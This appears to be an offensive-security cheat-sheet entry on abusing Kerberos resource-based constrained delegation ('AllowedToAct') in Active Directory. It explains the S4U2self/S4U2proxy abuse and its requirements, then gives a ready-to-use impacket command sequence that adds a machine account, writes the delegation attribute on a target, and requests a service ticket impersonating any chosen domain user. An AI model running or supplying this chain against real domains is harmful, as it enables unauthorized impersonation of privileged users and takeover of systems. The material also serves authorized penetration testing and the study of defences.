# AllowedToAct

Kerberos delegations allow services to access other services on behalf of domain users.

Resource based constrained delegations (RBCD) : a set of services can impersonate users on a service

An attacker can execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket “as” this user.

For this attack to work, the attacker needs to populate the target attribute with the SID of an account that Kerberos can consider as a service. A service ticket will be asked for it

### Requirements

* Control over an account with an SPN set or a computer account (they have an SPN by default)
* The impersonated user can't be part of the Protected Users group or be marked as sensitive

### Exploit

If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls

```shellscript
# Add a computer account (skip if we have control over an account with SPN)
impacket-addcomputer -computer-name 'attacker$' -computer-pass '<PASSWORD>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASSWORD>'

# Configure RBCD on the target
impacket-rbcd -delegate-to '<TARGET>' -delegate-from '<CONTROLLED_SPN_OR_COMPUTER_ACCOUNT>' -dc-ip <DC_IP> -action write <DOMAIN>/<USER>:'<PASSWORD>'

# Request a service ticket as a valuable target
impacket-getST -spn cifs/<DELEGATION_MACHINE> -impersonate <USER_TO_IMPERSONATE> -dc-ip <DC_IP> <DOMAIN>/<CONTROLLED_SPN_OR_COMPUTER_ACCOUNT>:'<PASSWORD>'
```
